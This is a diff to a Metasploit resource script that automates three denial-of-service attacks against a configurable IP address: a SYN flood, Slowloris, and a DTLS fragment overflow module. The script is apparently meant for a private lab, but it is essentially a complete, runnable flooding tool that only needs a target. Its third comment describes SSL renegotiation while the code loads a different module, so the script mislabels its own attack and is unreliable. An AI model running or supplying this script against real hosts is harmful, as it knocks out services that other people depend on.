@@ -3,47 +3,49 @@
 # Target: isolated Hyper-V VM (your own lab environment)
 #
 # Set TARGET before running, e.g.:
-#   export MSF_TARGET=192.168.1.100
-# Or edit RHOSTS lines below directly.
+#   export MSF_TARGET=10.20.4.254
+# Or edit the fallback IP below directly.
 
 <ruby>
-target = ENV['MSF_TARGET'] || '192.168.1.100'
+target = ENV['MSF_TARGET'] || '10.20.4.254'
 print_status("DoS demonstration target: #{target}")
-$target = target
-</ruby>
 
 # -------------------------------------------------------
-# 1. SYN Flood — exhausts TCP connection table (hits any open TCP port)
+# 1. SYN Flood — exhausts TCP connection table
 #    Effective against SSH (22), HTTP (80), HTTPS (443)
 # -------------------------------------------------------
-use auxiliary/dos/tcp/synflood
-set RHOSTS <ruby>$target</ruby>
-set RPORT 80
-set TIMEOUT 30
-set NUM_THREADS 50
-run
-back
+print_status("Running SYN flood on port 80...")
+run_single("use auxiliary/dos/tcp/synflood")
+run_single("set RHOSTS #{target}")
+run_single("set RPORT 80")
+run_single("set TIMEOUT 30")
+run_single("set NUM_THREADS 50")
+run_single("run")
+run_single("back")
 
 # -------------------------------------------------------
-# 2. Slowloris HTTP DoS — holds HTTP connections open
-#    until the server runs out of worker threads
-#    Only targets port 80 (HTTP)
+# 2. Slowloris — holds HTTP connections open until server
+#    runs out of worker threads
 # -------------------------------------------------------
-use auxiliary/dos/http/slowloris
-set RHOSTS <ruby>$target</ruby>
-set RPORT 80
-set SOCKETS 500
-set DELAY 15
-run
-back
+print_status("Running Slowloris on port 80...")
+run_single("use auxiliary/dos/http/slowloris")
+run_single("set RHOSTS #{target}")
+run_single("set RPORT 80")
+run_single("set SOCKETS 500")
+run_single("set DELAY 15")
+run_single("run")
+run_single("back")
 
 # -------------------------------------------------------
-# 3. SSL/HTTPS renegotiation DoS — forces repeated TLS
-#    handshakes, consuming server CPU
-#    Targets port 443 (HTTPS)
+# 3. SSL renegotiation DoS — forces repeated TLS handshakes,
+#    consuming server CPU on port 443
 # -------------------------------------------------------
-use auxiliary/dos/ssl/dtls_fragment_overflow
-set RHOSTS <ruby>$target</ruby>
-set RPORT 443
-run
-back
+print_status("Running SSL DoS on port 443...")
+run_single("use auxiliary/dos/ssl/dtls_fragment_overflow")
+run_single("set RHOSTS #{target}")
+run_single("set RPORT 443")
+run_single("run")
+run_single("back")
+
+print_status("All DoS demonstrations complete.")
+</ruby>
